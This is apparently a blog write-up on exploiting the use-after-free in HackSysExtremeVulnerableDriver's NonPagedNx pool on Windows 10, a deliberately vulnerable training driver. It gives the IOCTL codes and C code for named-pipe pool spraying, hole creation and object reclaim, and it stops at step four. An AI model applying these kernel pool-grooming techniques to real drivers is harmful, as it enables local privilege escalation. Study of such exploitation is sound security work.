# HEVD - UAF NONPAGEDNX VULNERABILITY

## INTRODUCTION

Searching the internet about windows kernel exploitation i have found a lot of resources related to HackSysExtremeVulnerableDriver in Windows 7. However, i haven't found many references related to HackSysExtremeVulnerableDriver in Windows 10, so i have decided to dig into Windows 10 modern kernel exploitation and develop an exploit for the Use After Free vulnerability in NonPagedNX pool affecting this driver.

## THE VULNERABILITY

The vulnerability is pretty simple to understand. There are two IOCTL calls that are related with the UaF vulnerability:

#### AllocateUaFObjectNonPagedPoolNX:
This IOCTL (0x222053) allocates an object in the NonPagedNx pool with the tag "Hack". The size of the object is 0x60 bytes and the returned pointer by ExAllocatePoolWithTag is stored in a global variable called g_UseAfterFreeObjectNonPagedPoolNx:

![Image](/images/AllocatePoolWithTag_0x222053.jpg)

#### FreeUaFObjectNonPagedPoolNx:

Calling the IOCTL (0x22205B) just free the previous allocated object:

![Image](/images/FreePoolWithTag_0x22205B.jpg)

There are other IOCTL calls related to this vulnerability like AllocateFakeObjectNonPagedPoolNX or UseUafObjectNonPagedPoolNX that are not needed. 
One of the main advantages of this vulnerability is that the attacker can control the time between the free and the use and that the attacker can free the vulnerable object multiple times.

## EXPLOITATION STRATEGY

Reading about Nonpaged pool exploitation in modern Windows kernel, the use of named pipes is a common strategy for grooming the pool. Specifically, using named pipes, objects of type DATA_QUEUE_ENTRY (https://doxygen.reactos.org/d8/d97/struct__NP__DATA__QUEUE__ENTRY.html) can be created in this memory space with the desired size and it is also possible to control part of the content of the object (except the header). 
These objects are tagged in the pool with the NpFr tag and can be created using the code below:

```
printf("[+] Spray 10,000 DATA_QUEUE_ENTRY objects in Non-Paged Pool\n");
	for (i = 0; i < 10000; i++) {

		PipeArrayB[i].Write = CreateNamedPipe(
			L"\\\\.\\pipe\\exploit_HEVD_UAF2",
			PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
			PIPE_TYPE_BYTE | PIPE_WAIT,
			PIPE_UNLIMITED_INSTANCES,
			DATA_ENTRY,
			DATA_ENTRY,
			0,
			0);
		PipeArrayB[i].Read = CreateFile(L"\\\\.\\pipe\\exploit_HEVD_UAF2", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);


		res = WriteFile(PipeArrayB[i].Write, payload, DATA_ENTRY, &resultLength, NULL); //Allocate 0x60 bytes en NpFr POOL

		if (!res)
		{
			printf("[-] Failed to writeFile payloadMid %d", GetLastError());
			return;
		}

	}
  ```
  
  In this code example, the body of the DATA_QUEUE_ENTRY object is 0x28. This is the size of the data written in the entry. The object has also a header of 0x30 bytes that is represented by the struct below:
  
   ```
  struct DATA_QUEUE_ENTRY {
    LIST_ENTRY NextEntry;
    _IRP* Irp;
    _SECURITY_CLIENT_CONTEXT* SecurityContext;
    uint32_t EntryType;
    uint32_t QuotaInEntry;
    uint32_t DataSize;
    uint32_t x;
    char Data[];
}
 ```
 
So the total size of the object in memory is 0x58. This almost fit the size of the object (0x60) used by HEVD, but from the prespective of the memory manager both objects are of the same size. For now, just mention that the DataSize field stores the size of the data written in the DATA_QUEUE_ENTRY of the named pipe with the WriteFile API. The char data[] array includes the written data. 
Using the vulnerability, we can potentially free a space of 0x60 bytes in pool memory and reclaim this space using a fake DATA_QUEUE_ENTRY object (NpFr tag). The size of 0x60 indicate that the  Segment Heap backend used by the aplication is LFH.

The strategy to achieve this goal is detailed below:

####  1. Spray the pool with 10000  DATA_QUEUE_ENTRY objects:

```
printf("[+] Spray 10,000 DATA_QUEUE_ENTRY objects in Non-Paged Pool\n");
	for (i = 0; i < 10000; i++) {

		PipeArrayB[i].Write = CreateNamedPipe(
			L"\\\\.\\pipe\\exploit_HEVD_UAF2",
			PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
			PIPE_TYPE_BYTE | PIPE_WAIT,
			PIPE_UNLIMITED_INSTANCES,
			DATA_ENTRY,
			DATA_ENTRY,
			0,
			0);
		PipeArrayB[i].Read = CreateFile(L"\\\\.\\pipe\\exploit_HEVD_UAF2", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);


		res = WriteFile(PipeArrayB[i].Write, payload, DATA_ENTRY, &resultLength, NULL); //Allocate 0x60 bytes en NpFr POOL

		if (!res)
		{
			printf("[-] Failed to writeFile payloadMid %d", GetLastError());
			return;
		}

	}
  ```
  
  After this spray, the nonpaged pool memory should looks like:
  
  ![Image](/images/spray1.jpg)
  
  ####  2. Create holes
  
After this, we create holes by freeing some of the DATA_QUEUE_ENTRY objects. To free the objects we just need to call CloseHandle() API using as parameter the read and write handles returned by CreateFile() and CreatedNamedPipe():

   ```
void CreateHoles() {

	UINT i = 0;
	DWORD readBytes = 0;

	for (i = 0; i < 10000; i+=4) {
		if (!CloseHandle(PipeArrayB[i].Read) && !CloseHandle(PipeArrayB[i].Write)) {
			printf("Failed to Close Handle of Objects in readPipeArrayB and writePipeArrayB: 0x%X\n", GetLastError());
			return;
		}

	}
	printf("[+] Close handles to create holes in Non-Paged Pool\n");
}
 ```
 
 The memory layout after freeing objects is showed below:
 
   ![Image](/images/holes1.jpg)
   
At this point, we have 0x60 size holes in the NonPaged pool memory. The goal now is to allocate the g_UseAfterFreeObjectNonPagedPoolNx (HEVD.sys) in one of this holes by calling the 0x222053 IOCTL and then free this object calling the IOCTL 0x22205B:
 
    ```
 //allocate HEVD object
	printf("[+] Allocate HEVD object\n");
	DeviceIoControl(hevd, IOCTL_ALLOC_NX, NULL, 0, NULL, 0, &BytesReturned, NULL);
	printf("[+] Free HEVD object\n");
	//free  HEVD object
	DeviceIoControl(hevd, IOCTL_FREE_NX, NULL, 0, NULL, 0, &BytesReturned, NULL);
 ```

   
The memory layout at this point is showed below:
   
      ![Image](/images/HEVD.jpg)
      
      
      
####  3. Reclaim freed HEVD object
       
    Right now we need to reclaim the freed HEVD object spraying again with NpFr (DATA_QUEUE_ENTRY) objects. The code is the that used previously in step 1.
    
    It's important to use the same unique pipe name that was used in the first spray. The reason of this will be explained in the next section and it's related with the cleanup process. At this point the memory layout is showed below:
    
      ![Image](/images/AllocNpFr.jpg)
      
In the image above we see in green that the previously allocated HEVD object has been filled by a DATA_QUEUE_ENTRY object (tagged with NpFr).
      
   ####  4. Free DATA_QUEUE_ENTRY object
   
 Now we can trigger the free IOCTL 0x22205B  again to free this NpFr object obtaining the memory laylout below:
      
      
   
